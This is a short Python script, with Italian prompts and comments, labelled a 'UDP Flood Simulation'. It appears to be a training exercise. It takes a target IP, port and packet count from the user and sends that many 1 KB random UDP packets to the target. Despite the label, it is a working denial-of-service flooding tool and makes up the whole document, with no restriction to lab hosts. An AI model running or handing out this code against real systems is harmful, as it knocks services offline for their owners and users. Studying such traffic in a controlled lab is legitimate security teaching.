import socket
import random
import sys

def main():
    print("--- UDP Flood Simulation ---")
    try:
        # Input dell'utente
        target_ip = input("Inserisci l'IP della macchina target: ")
        target_port = int(input("Inserisci la porta UDP della macchina target: "))
        num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Creazione del pacchetto da 1 KB
        packet = random.randbytes(1024)

        print(f"Inviando {num_packets} pacchetti verso {target_ip}:{target_port}...")

        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))
            if (i + 1) % 100 == 0:
                print(f"{i + 1} pacchetti inviati...")

        print("UDP flood completato con successo!")

    except ValueError:
        print("Errore: Inserisci un valore valido per IP, porta o numero di pacchetti.")
    except KeyboardInterrupt:
        print("\nInterrotto dall'utente.")
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
